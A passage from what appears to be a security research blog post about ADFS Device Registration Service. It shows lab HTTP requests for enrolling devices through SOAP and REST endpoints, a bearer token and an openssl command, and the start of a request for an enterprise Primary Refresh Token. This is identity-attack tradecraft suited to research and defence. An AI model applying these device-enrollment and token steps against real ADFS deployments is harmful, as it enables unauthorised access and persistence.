xmlns=&quot;http://schemas.xmlsoap.org/ws/2006/12/authorization&quot;&gt;&lt;ContextItem Name=&quot;UserPrincipalName&quot;&gt;&lt;Value&gt;itadmin@lab.local&lt;/Value&gt;&lt;/ContextItem&gt;&lt;/AdditionalContext&gt;&lt;/RequestSecurityTokenResponse&gt;&lt;/RequestSecurityTokenResponseCollection&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;</span></pre><p id="cc25" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Unfortunately this isn’t going to be another ESC99 style attack as the CA used to sign the token is the ADFS internal CA rather than ADCS (I can read your mind). But we’ll need this when using Device Authentication later.</p><p id="ce22" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">If we take this base64 encoded certificate and decode it we get something like this:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="6910" class="pv nx gu nv b bg pw px l py pz">&lt;wap-provisioningdoc version=&quot;1.1&quot;&gt;<br/>  &lt;characteristic type=&quot;CertificateStore&quot;&gt;<br/>    &lt;characteristic type=&quot;My&quot;&gt;<br/>      &lt;characteristic type=&quot;User&quot;&gt;<br/>        &lt;characteristic type=&quot;E2246E3845E4928781128D6A4832B84EF1149FAF&quot;&gt;<br/>          &lt;parm name=&quot;EncodedCertificate&quot; value=&quot;MIID/jCCAuagAwIBAgIQXXMccvjIsqdJ3Rd5smED[...]gDO1wJL3j&quot; /&gt;<br/>        &lt;/characteristic&gt;<br/>      &lt;/characteristic&gt;<br/>    &lt;/characteristic&gt;<br/>  &lt;/characteristic&gt;<br/>&lt;/wap-provisioningdoc&gt;</span></pre><p id="804a" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">We take the <code class="cx ns nt nu nv b">EncodedCertificate</code> value and base64 decode this to generate our signed public key certificate. Usually it’s best to combine this with the private key into a PFX with something like:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="9042" class="pv nx gu nv b bg pw px l py pz">openssl pkcs12 -export -out device_cert.pfx -inkey private_key.pem -in device_registration.crt</span></pre><p id="def5" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">So once we have completed this SOAP request and we have our signed certificate, in Active Directory, we’ll find our new <code class="cx ns nt nu nv b">msDS-Device</code> object:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div class="pa pb qw"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*O5GL5ZmpFmzDXGD7OkdGIA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*O5GL5ZmpFmzDXGD7OkdGIA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*O5GL5ZmpFmzDXGD7OkdGIA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*O5GL5ZmpFmzDXGD7OkdGIA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*O5GL5ZmpFmzDXGD7OkdGIA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*O5GL5ZmpFmzDXGD7OkdGIA.png 1100w, https://miro.medium.com/v2/resize:fit:1112/format:webp/1*O5GL5ZmpFmzDXGD7OkdGIA.png 1112w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 556px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*O5GL5ZmpFmzDXGD7OkdGIA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*O5GL5ZmpFmzDXGD7OkdGIA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*O5GL5ZmpFmzDXGD7OkdGIA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*O5GL5ZmpFmzDXGD7OkdGIA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*O5GL5ZmpFmzDXGD7OkdGIA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*O5GL5ZmpFmzDXGD7OkdGIA.png 1100w, https://miro.medium.com/v2/resize:fit:1112/1*O5GL5ZmpFmzDXGD7OkdGIA.png 1112w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 556px"/><img alt="" class="bh mb pn c" width="556" height="633" loading="lazy" role="presentation"/></picture></div></figure><p id="3120" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">If we are shooting for accessing ADFS using <code class="cx ns nt nu nv b">ClientTLS</code>, this should be enough. However as we’ll see later on when looking at <code class="cx ns nt nu nv b">SignedToken</code>, there are a few issues with this SOAP API method of creating a new <code class="cx ns nt nu nv b">msDS-Device</code>. The big one for us is that the <code class="cx ns nt nu nv b">msDS-KeyCredentialLink</code> attribute isn’t populated in AD (for anyone who has explored Entra ID before, you’ll likely know that this is required for the session transport key used during the PRT provisioning process).</p><p id="610c" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">As a side note, I “think” that this web service was actually used to support an earlier iteration of DRS, before Entra ID was so tightly integrated with Windows. During the Windows 8 days, DRS was a simpler method of generating certificates for device authentication and using <code class="cx ns nt nu nv b">ClientTLS</code>, which makes sense as to why the <code class="cx ns nt nu nv b">msDS-KeyCredentialLink</code> parameter was never used… but this is just a guess.</p><h1 id="7b7b" class="nw nx gu bf ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot bk">EnrollmentServer REST API</h1><p id="849e" class="pw-post-body-paragraph mu mv gu mw b mx ou mz na nb ov nd ne nf ow nh ni nj ox nl nm nn oy np nq nr gn bk">The second endpoint referenced in the <code class="cx ns nt nu nv b">/EnrollmentServer/contract</code> endpoint is the <code class="cx ns nt nu nv b">/EnrollmentServer/device/</code> service:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb qx"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*F9VUBqJ4BMwQm6Lk9g3qYA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*F9VUBqJ4BMwQm6Lk9g3qYA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*F9VUBqJ4BMwQm6Lk9g3qYA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*F9VUBqJ4BMwQm6Lk9g3qYA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*F9VUBqJ4BMwQm6Lk9g3qYA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*F9VUBqJ4BMwQm6Lk9g3qYA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*F9VUBqJ4BMwQm6Lk9g3qYA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*F9VUBqJ4BMwQm6Lk9g3qYA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*F9VUBqJ4BMwQm6Lk9g3qYA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*F9VUBqJ4BMwQm6Lk9g3qYA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*F9VUBqJ4BMwQm6Lk9g3qYA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*F9VUBqJ4BMwQm6Lk9g3qYA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*F9VUBqJ4BMwQm6Lk9g3qYA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*F9VUBqJ4BMwQm6Lk9g3qYA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="236" loading="lazy" role="presentation"/></picture></div></div></figure><p id="b8dc" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Again this may look familiar as it’s a clone of the <code class="cx ns nt nu nv b"><a class="af oz" href="https://enterpriseregistration.windows.net/EnrollmentServer/device/" rel="noopener ugc nofollow" target="_blank">https://enterpriseregistration.windows.net/EnrollmentServer/device/</a></code> service used during Entra device registration.</p><p id="49fc" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">This REST API is the more complete way to create a new <code class="cx ns nt nu nv b">msDS-Device</code> as it allows us to provide values for the <code class="cx ns nt nu nv b">msDS-KeyCredentialLink</code> (huge thanks to <a class="af oz" href="https://x.com/DrAzureAD" rel="noopener ugc nofollow" target="_blank">@DrAzureAD</a> and the post <a class="af oz" href="https://aadinternals.com/post/devices/" rel="noopener ugc nofollow" target="_blank">“Deep-dive to Azure AD device join”</a> which saved a lot of time and effort uncovering the structure of this request, you’re contributions to the infosec scene are always appreciated!):</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="96a3" class="pv nx gu nv b bg pw px l py pz">POST https://adfs.lab.local/EnrollmentServer/device/?api-version=1.0 HTTP/1.1<br/>Content-Type: application/soap+xml; charset=utf-8<br/>User-Agent: dd762716-544d-4aeb-a526-687b73838a22<br/>Host: adfs.lab.local<br/>Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkFZcS1lSE5wVHdmcnFxVHcwM3k0d3NJRTBHUSIsImtpZCI6IkFZcS1lSE5wVHdmcnFxVHcwM3k0d3NJRTBHUSJ9.eyJhdWQiOiJ1cm46bXMtZHJzOjQzNERGNEE5LTNDRjItNEMxRC05MTdFLTJDRDJCNzJGNTE1QSIsImlzcyI6Imh0dHA6Ly9hZGZzLmxhYi5sb2NhbC9hZGZzL3NlcnZpY2VzL3RydXN0IiwiaWF0IjoxNzM0MzA2NDc1LCJuYmYiOjE3MzQzMDY0NzUsImV4cCI6MTczNDMxMDA3NSwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvaW1wbGljaXR1cG4iOiJpdGFkbWluQGxhYi5sb2NhbCIsInJzIjoibm90ZXZhbHVhdGVkIiwidGhyb3R0bGVkIjoiZmFsc2UiLCJhbXAiOiJGb3Jtc0F1dGhlbnRpY2F0aW9uIiwiYXV0aF90aW1lIjoiMjAyNC0xMi0xNVQyMzo0Nzo1NC44NjdaIiwiYXV0aG1ldGhvZCI6InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphYzpjbGFzc2VzOlBhc3N3b3JkUHJvdGVjdGVkVHJhbnNwb3J0IiwiYW5jaG9yIjoid2luYWNjb3VudG5hbWUiLCJ1cG4iOiJpdGFkbWluQGxhYi5sb2NhbCIsInByaW1hcnlzaWQiOiJTLTEtNS0yMS0zODU5Mjg2ODc4LTI4NTc1NjM3MjQtMTA1OTM5NjI5Ny0xMDAwIiwidW5pcXVlX25hbWUiOiJsYWJcXGl0YWRtaW4iLCJ3aW5hY2NvdW50bmFtZSI6ImxhYlxcaXRhZG1pbiIsImFtciI6InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphYzpjbGFzc2VzOlBhc3N3b3JkUHJvdGVjdGVkVHJhbnNwb3J0IiwiYXBwaWQiOiJkZDc2MjcxNi01NDRkLTRhZWItYTUyNi02ODdiNzM4MzhhMjIiLCJhcHB0eXBlIjoiUHVibGljIiwiY2xpZW50dXNlcmFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNiIsImVuZHBvaW50cGF0aCI6Ii9hZGZzL29hdXRoMi9hdXRob3JpemUiLCJpbnNpZGVjb3JwbmV0d29yayI6ImZhbHNlIiwicHJveHkiOiJBREZTUHJveHkiLCJjbGllbnRyZXFpZCI6IjEwMWNjYzI3LTMwNDgtNGJlMi0wYTAwLTAwODAwMDAwMDBlMyIsImNsaWVudGlwIjoiMTkyLjE2OC4xMzAuMTAiLCJmb3J3YXJkZWRjbGllbnRpcCI6IjEwMC43Ny45NC41MSIsInVzZXJpcCI6IjEwMC43Ny45NC41MSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vYXV0aG9yaXphdGlvbi9jbGFpbXMvUGVybWl0RGV2aWNlUmVnaXN0cmF0aW9uIjoidHJ1ZSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vYXV0aG9yaXphdGlvbi9jbGFpbXMvZGV2aWNlcmVnaXN0cmF0aW9ucXVvdGEiOiIyMTQ3NDgzNjQ3IiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS9hdXRob3JpemF0aW9uL2NsYWltcy9hY2NvdW50U3RvcmUiOiJBRCBBVVRIT1JJVFkiLCJ2ZXIiOiIxLjAifQ.UuHeR9KWONFQnxC0hnppid1HgCA5dZZ9Xw9RCZn9bTHkBUZzJ_fquD19z2OWJhQOg1VBr4yVlYTHwqJELmYEiCsSXX5iMkSK0GMoZywPP4N1yvgtgEpnYHxYSKhM3M7tj1s2HfsWxTAS7d6dm95y3rujIZOeWghN9XxAX6rn2x7ZRFvhffB3XGbTEiK9-WByawJtA0yjr5bg2zzykbPPFlA9j1M5ql94K5tvcP0zXA5i74n5I55KgnEO-Ba9gWu0FTBo0R4Gjuwfu6vFQ-GYCeWSVQjTeVg66G3IGB5JE8O2Ko94XQ-IGy5aNj0sdcDE0Zw3cV9PaVb7n6QDy0mAig<br/>Content-Length: 1792<br/>Cache-Control: no-cache<br/><br/> {<br/> &quot;TransportKey&quot;: &quot;UlNBMQAIAAADA[...]Gckayg68kIQ9iGtkxN52fQ==&quot;,<br/>  &quot;JoinType&quot;:4,<br/>  &quot;DeviceDisplayName&quot;: &quot;New Test Device&quot;,<br/>  &quot;OSVersion&quot;:  &quot;Windows 6.1.2.3&quot;,<br/>  &quot;CertificateRequest&quot;:  {<br/>     &quot;Type&quot;:  &quot;pkcs10&quot;,<br/>     &quot;Data&quot;:  &quot;MIICijCCAXICAm6G5l[...]B1KAjEaLjcav/sOBzZhLRxoMXIJ7lClxV7&quot;<br/>  },<br/>  &quot;TargetDomain&quot;:  &quot;lab.local&quot;,<br/>  &quot;DeviceType&quot;:  &quot;x64&quot;,<br/>  &quot;Attributes&quot;:  {<br/>      &quot;ReuseDevice&quot;:  true,<br/>      &quot;ReturnClientSid&quot;:  true,<br/>      &quot;SharedDevice&quot;:  false<br/>  }<br/>}</span></pre><p id="4a6d" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">We authenticate to this service using a more traditional <code class="cx ns nt nu nv b">Authorization</code> header, providing our DRS Access Token as a bearer.</p><p id="4784" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Again a few additional things to note with the body of this request. The first is the <code class="cx ns nt nu nv b">JoinType</code>. This can be set to one of the following values (not all are actually supported unfortunately):</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="8852" class="pv nx gu nv b bg pw px l py pz">namespace Microsoft.DeviceRegistration.Entities<br/>{<br/>	public enum JoinType<br/>	{<br/>		DeviceJoin, // 0<br/>		DeviceUserJoin, // 1<br/>		DeviceRenew, // 2 <br/>		DeviceUserRenew, // 3<br/>		WorkplaceJoin, // 4<br/>		WorkplaceRenew, // 5<br/>		DomainJoin, // 6<br/>		UnJoin // 7<br/>	}<br/>}</span></pre><p id="13b0" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">There is now also the <code class="cx ns nt nu nv b">TransportKey</code> value which was missing in the earlier service call.</p><p id="49b4" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">The response to this is again the signed certificate:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="3e84" class="pv nx gu nv b bg pw px l py pz">HTTP/1.1 200 OK<br/>Content-Length: 1552<br/>Content-Type: application/json<br/>...<br/><br/>{<br/>  &quot;Certificate&quot;:{<br/>    &quot;Thumbprint&quot;:&quot;C367257B04D86A371A04E58256CE96687F91CBB4&quot;,<br/>    &quot;RawBody&quot;:&quot;MIID/jCCAuagA[...]oQz0JVEdcZBfPhPAadyLFvjS6KiieWwQwsop2+R&quot;<br/>  },<br/>  &quot;User&quot;:{<br/>    &quot;Upn&quot;:&quot;itadmin@lab.local&quot;<br/>  },<br/>  &quot;MembershipChanges&quot;:[<br/>  {<br/>    &quot;LocalSID&quot;:&quot;S-1-5-32-544&quot;,<br/>    &quot;AddSIDs&quot;:[]<br/>  }]<br/>}</span></pre><p id="16c4" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Again this results in a new <code class="cx ns nt nu nv b">msDS-Device</code> object, but now with the <code class="cx ns nt nu nv b">msDS-KeyCredentialLink</code> attribute populated to our <code class="cx ns nt nu nv b">TransportKey</code> value:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb qy"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*gGAiBlc9XV4FvTUwEsvexQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*gGAiBlc9XV4FvTUwEsvexQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*gGAiBlc9XV4FvTUwEsvexQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*gGAiBlc9XV4FvTUwEsvexQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*gGAiBlc9XV4FvTUwEsvexQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*gGAiBlc9XV4FvTUwEsvexQ.png 1100w, https://miro.medium.com/v2/resize:fit:940/format:webp/1*gGAiBlc9XV4FvTUwEsvexQ.png 940w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 470px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*gGAiBlc9XV4FvTUwEsvexQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*gGAiBlc9XV4FvTUwEsvexQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*gGAiBlc9XV4FvTUwEsvexQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*gGAiBlc9XV4FvTUwEsvexQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*gGAiBlc9XV4FvTUwEsvexQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*gGAiBlc9XV4FvTUwEsvexQ.png 1100w, https://miro.medium.com/v2/resize:fit:940/1*gGAiBlc9XV4FvTUwEsvexQ.png 940w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 470px"/><img alt="" class="bh mb pn c" width="470" height="250" loading="lazy" role="presentation"/></picture></div></div></figure><p id="b9c5" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">So now we can enrol our devices, how do we actually go about authenticating ourselves using the Device Authentication methods explored earlier?</p><p id="aec7" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Well we’ve already discussed <code class="cx ns nt nu nv b">ClientTLS</code> quite a bit in this post, which is your basic Certificate Authentication (I usually just use Burp Suite for this):</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb qz"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*KEhQ_NwFTrC76_PYrm15cA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*KEhQ_NwFTrC76_PYrm15cA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*KEhQ_NwFTrC76_PYrm15cA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*KEhQ_NwFTrC76_PYrm15cA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*KEhQ_NwFTrC76_PYrm15cA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*KEhQ_NwFTrC76_PYrm15cA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KEhQ_NwFTrC76_PYrm15cA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*KEhQ_NwFTrC76_PYrm15cA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*KEhQ_NwFTrC76_PYrm15cA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*KEhQ_NwFTrC76_PYrm15cA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*KEhQ_NwFTrC76_PYrm15cA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*KEhQ_NwFTrC76_PYrm15cA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*KEhQ_NwFTrC76_PYrm15cA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*KEhQ_NwFTrC76_PYrm15cA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="220" loading="lazy" role="presentation"/></picture></div></div></figure><p id="f719" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">But what about if <code class="cx ns nt nu nv b">ClientTLS</code> isn’t in use?</p><h1 id="82cd" class="nw nx gu bf ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot bk">Enterprise Primary Refresh Token</h1><p id="3a20" class="pw-post-body-paragraph mu mv gu mw b mx ou mz na nb ov nd ne nf ow nh ni nj ox nl nm nn oy np nq nr gn bk">Another new discovery for me, was that Primary Refresh Tokens are supported on ADFS. And as we saw earlier, this is the default method of Device Authentication supported after ADFS 2016 as <code class="cx ns nt nu nv b">SignedToken</code>.</p><p id="7509" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">This works mostly in the same way as Entra ID, so it’s essential that I give a massive shout out to <a class="af oz" href="https://x.com/_dirkjan?lang=en-GB" rel="noopener ugc nofollow" target="_blank">@_dirkjan</a> and his epic work in this area with <a class="af oz" href="https://github.com/dirkjanm/ROADtools" rel="noopener ugc nofollow" target="_blank">ROADTools,</a> <a class="af oz" href="https://dirkjanm.io/digging-further-into-the-primary-refresh-token/" rel="noopener ugc nofollow" target="_blank">blog posts</a> and <a class="af oz" href="https://outsidersecurity.nl/training/" rel="noopener ugc nofollow" target="_blank">training</a>. His work and sharing of knowledge provided a huge portion of examples and code to work with while looking at this on ADFS.</p><p id="f1a5" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">So first we need a nonce value which is requested from <code class="cx ns nt nu nv b">/adfs/oauth2/token</code>:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="e022" class="pv nx gu nv b bg pw px l py pz">POST https://adfs.lab.local/adfs/oauth2/token HTTP/1.1<br/>Content-Type: application/soap+xml; charset=utf-8<br/>User-Agent: dd762716-544d-4aeb-a526-687b73838a22<br/>Host: adfs.lab.local<br/>Content-Length: 24<br/>Cache-Control: no-cache<br/><br/>grant_type=srv_challenge</span></pre><p id="157f" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">The response from this call returns the nonce value:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="8e55" class="pv nx gu nv b bg pw px l py pz">HTTP/1.1 200 OK<br/>...<br/>{<br/>    &quot;Nonce&quot;:&quot;eyJWZXJzaW9uIjoxLCJFbmVVhzQU5[...]dHJ1ZX0&quot;<br/>}</span></pre><p id="fb94" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Next we need to request the PRT. This is done by creating a JWT bearer token which is signed with our generated device certificate:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="7f8f" class="pv nx gu nv b bg pw px l py pz">POST /adfs/oauth2/token HTTP/1.1<br/>Host: adfs.lab.local<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 7808<br/><br/>grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Ajwt-bearer&amp;<br/>request=eyJhbGciOiJSUzI1NiIsI...</span></pre><p id="345e" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">The required content of this JWT are documented in <a class="af oz" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-oapxbc/11e4a749-5064-4c6c-86f8-8c76de699e9f" rel="noopener ugc nofollow" target="_blank">MS-OAPXBC</a>. As with Entra ID, we can authenticate our user within the JWT using one of three methods:</p><ul class=""><li id="4466" class="mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr qg qh qi bk">Username / Password</li><li id="208b" class="mu mv gu mw b mx qj mz na nb qk nd ne nf ql nh ni nj qm nl nm nn qn np nq nr qg qh qi bk">Refresh Token</li><li id="ad41" class="mu mv gu mw b mx qj mz na nb qk nd ne nf ql nh ni nj qm nl nm nn qn np nq nr qg qh qi bk">Signed JWT</li></ul><p id="b35e" class="pw-post-body-paragraph mu mv gu mw b mx my 